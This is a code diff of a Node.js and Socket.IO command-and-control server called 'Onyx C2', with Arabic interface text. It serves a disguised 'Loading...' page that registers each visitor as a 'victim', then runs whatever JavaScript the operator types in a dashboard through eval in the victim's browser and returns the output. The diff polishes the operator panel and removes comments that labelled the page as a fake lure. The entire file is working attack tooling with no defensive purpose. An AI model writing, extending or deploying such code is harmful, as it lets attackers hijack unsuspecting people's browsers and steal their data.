@@ -8,17 +8,15 @@ const io = new Server(server);
 
 const PORT = process.env.PORT || 3000;
 
-// تخزين الأجهزة المتصلة
 let victims = {};
 
-// صفحة لوحة التحكم الخاصة بك
 app.get('/dashboard', (req, res) => {
     let html = `
     <!DOCTYPE html>
     <html lang="ar" dir="rtl">
     <head>
         <meta charset="UTF-8">
-        <title>Onyx Master Control, baby</title>
+        <title>Onyx Master Control</title>
         <style>
             body { background: #0b0f19; color: #f8fafc; font-family: monospace; padding: 20px; }
             h1 { color: #38bdf8; }
@@ -30,7 +28,7 @@ app.get('/dashboard', (req, res) => {
     </head>
     <body>
         <h1>Onyx C2 - لوحة السيطرة</h1>
-        <div id="victims-list"></div>
+        <div id="victims-list">لا توجد أجهزة متصلة حالياً...</div>
 
         <script src="/socket.io/socket.io.js"></script>
         <script>
@@ -39,28 +37,35 @@ app.get('/dashboard', (req, res) => {
 
             socket.on('update-victims', (data) => {
                 const list = document.getElementById('victims-list');
-                list.innerHTML = '';
-                for (let id in data) {
-                    let v = data[id];
-                    list.innerHTML += \`
-                        <div class="victim-card">
-                            <strong>معرف الضحية:</strong> \${id}<br>
-                            <strong>الجهاز:</strong> \${v.userAgent}<br>
-                            <input type="text" id="cmd-\${id}" placeholder="اكتب الأمر (مثال: alert('Hacked') أو fetch...)" style="width: 70%;">
-                            <button onclick="sendCmd('\${id}')">تنفيذ على الجوال</button>
-                            <pre id="output-\\${id}">في انتظار الرد...</pre>
-                        </div>
-                    \`;
+                const keys = Object.keys(data);
+                if (keys.length === 0) {
+                    list.innerHTML = 'لا توجد أجهزة متصلة حالياً...';
+                    return;
                 }
+                list.innerHTML = '';
+                keys.forEach(id => {
+                    let v = data[id];
+                    list.innerHTML += `
+                        <div class="victim-card">
+                            <strong>معرف الضحية:</strong> ${id}<br>
+                            <strong>الجهاز:</strong> ${v.userAgent}<br>
+                            <input type="text" id="cmd-${id}" placeholder="اكتب الأمر هنا..." style="width: 70%;">
+                            <button onclick="sendCmd('${id}')">تنفيذ</button>
+                            <pre id="output-${id}">في انتظار الرد...</pre>
+                        </div>
+                    `;
+                });
             });
 
             function sendCmd(id) {
                 const cmd = document.getElementById('cmd-' + id).value;
+                if(!cmd) return;
                 socket.emit('admin-command', { targetId: id, command: cmd });
             }
 
             socket.on('cmd-result', (data) => {
-                document.getElementById('output-' + data.id).innerText = data.result;
+                const out = document.getElementById('output-' + data.id);
+                if(out) out.innerText = data.result;
             });
         </script>
     </body>
@@ -69,23 +74,17 @@ app.get('/dashboard', (req, res) => {
     res.send(html);
 });
 
-// الصفحة الوهمية التي تفتح عند الضحية
 app.get('/', (req, res) => {
     res.send(`
     <!DOCTYPE html>
     <html lang="ar">
-    <head>
-        <meta charset="UTF-8">
-        <title>Loading...</title>
-    </head>
+    <head><meta charset="UTF-8"><title>Loading...</title></head>
     <body>
         <h2>جاري التحميل، يرجى الانتظار...</h2>
         <script src="/socket.io/socket.io.js"></script>
         <script>
             const socket = io();
-            
             socket.on('connect', () => {
-                // إرسال معلومات جهاز الضحية بمجرد فتح الرابط
                 socket.emit('register-victim', {
                     userAgent: navigator.userAgent,
                     platform: navigator.platform,
@@ -93,10 +92,9 @@ app.get('/', (req, res) => {
                 });
             });
 
-            // استقبال الأوامر وتنفيذها داخل المتصفح وإرجاع النتيجة
             socket.on('exec-command', async (cmd) => {
                 try {
-                    let res = eval(cmd); // تنفيذ الأمر برمجياً في المتصفح
+                    let res = eval(cmd);
                     if (res instanceof Promise) res = await res;
                     socket.emit('command-response', { result: String(res) });
                 } catch (err) {
@@ -109,12 +107,11 @@ app.get('/', (req, res) => {
     `);
 });
 
-// إدارة الاتصالات الحية عبر الـ WebSocket
 io.on('connection', (socket) => {
     socket.on('register-victim', (info) => {
         victims[socket.id] = { ...info, socket: socket };
-        io.emit('update-victims', getVictimsData());
-        console.log(`[+] ضحية جديدة مرتبطة: ${socket.id}`);
+        io.to('admins').emit('update-victims', getVictimsData());
+        console.log(`[+] اتصال ضحية جديدة: ${socket.id}`);
     });
 
     socket.on('register-admin', () => {
@@ -135,7 +132,7 @@ io.on('connection', (socket) => {
     socket.on('disconnect', () => {
         if (victims[socket.id]) {
             delete victims[socket.id];
-            io.emit('update-victims', getVictimsData());
+            io.to('admins').emit('update-victims', getVictimsData());
             console.log(`[-] انقطع اتصال الضحية: ${socket.id}`);
         }
     });
@@ -150,5 +147,5 @@ function getVictimsData() {
 }
 
 server.listen(PORT, () => {
-    console.log(`[*] السيرفر شغال على البورت ${PORT} يا ببي...`);
+    console.log(`[*] السيرفر شغال بقوة على البورت ${PORT}`);
 });
